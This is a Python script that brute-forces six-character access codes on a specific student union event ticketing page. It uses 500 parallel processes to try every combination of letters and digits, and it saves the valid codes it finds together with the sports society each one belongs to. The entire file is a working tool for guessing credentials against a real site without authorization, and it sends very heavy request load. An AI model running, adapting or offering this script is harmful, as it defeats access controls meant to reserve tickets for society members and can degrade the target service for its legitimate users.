# Program to automatically find access codes for sports night societies

from typing import Generator
from requests.adapters import HTTPAdapter, Retry
from bs4 import BeautifulSoup, NavigableString, Tag
from multiprocessing import Pool, Manager
from file_utils import save_dictionary_to_file
import requests
import threading
import time
import string
import itertools
from sys import stdout


session = requests.Session()
retries = Retry(total=10, backoff_factor=60, status_forcelist=[500, 502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retries))

url = "https://www.guildofstudents.com/ents/event/9497/?code="

characters: list[str] = string.ascii_uppercase + string.ascii_lowercase + string.digits

POSSIBLE_CODES: Generator[str, None, None] = (f"{a}{b}{c}{d}{e}{f}" for a, b, c, d, e, f in itertools.product(characters, repeat=6))
TOTAL_POSSIBLE_CODES: int = 56800235584

def check_for_code(args: list[str]) -> None:
    code: str = args[0]
    valid_codes: dict[str, str] = args[1]
    lock: threading.Lock = args[2]
    checked_code_counter: int = args[3]
    counter_lock: threading.Lock = args[4]
    # print("[INFO] Checking code: " + codes

    with counter_lock:
        checked_code_counter.value += 1
        percentage_complete: float = round((checked_code_counter.value / TOTAL_POSSIBLE_CODES) * 100, 4)
        stdout.write(f"\r[INFO] Checked {checked_code_counter.value} of {TOTAL_POSSIBLE_CODES} possible codes. ({percentage_complete}%)")
        stdout.flush()

    try:
        page = session.get(url + code).text
    except requests.exceptions.RetryError:
        print("[ERROR] RetryError for code: " + code)
        return

    soup = BeautifulSoup(page, 'html.parser')

    inner_ticket_box: Tag | NavigableString | None = soup.find('div', class_="event_tickets")

    if not inner_ticket_box or not isinstance(inner_ticket_box, Tag):
        # print("[ERROR] Inner ticket box not found")
        return

    if len(inner_ticket_box.find_all('div', class_="event_ticket")) == 1:
        # print("[INFO] Valid Code! " + code)
        # get the span inside the first div
        society_name = inner_ticket_box.find('div').find('span').text
        # format: £6.00 (Swimming)
        # Find the value in the brackets
        society_name: str = society_name[society_name.find("(") + 1:society_name.find(")")]
        # print("[INFO] Society name: " + society_name)
        # save to the dictionary
        print("[INFO] Found valid code: " + code + " for society: " + society_name + " at " + time.strftime("%H:%M:%S"))
        with lock:
            valid_codes[society_name] = code
    else: 
        print("[ERROR] Unexpected number of DIVs... found: " + str(len(inner_ticket_box.find_all('div'))))
        print(["[DEBUG]", inner_ticket_box])


def iterate_over_all_codes() -> None:
    # codes can be any 6 digits, so iterate over all of them
    with Manager() as manager:

        valid_codes: dict[str, str] = manager.dict()
        checked_code_counter: int = manager.Value('i', 0)
        dict_lock: threading.Lock = manager.Lock()
        counter_lock: threading.Lock = manager.Lock()

        with Pool(processes=500) as pool:
            for _ in pool.imap_unordered(check_for_code, ((code, valid_codes, dict_lock, checked_code_counter, counter_lock) for code in POSSIBLE_CODES), chunksize=10000):
                pass

        save_dictionary_to_file(dict(valid_codes))


if __name__ == "__main__":
    print("[INFO] Starting at " + time.strftime("%H:%M:%S"))
    iterate_over_all_codes()
    print("[INFO] Finished at " + time.strftime("%H:%M:%S"))
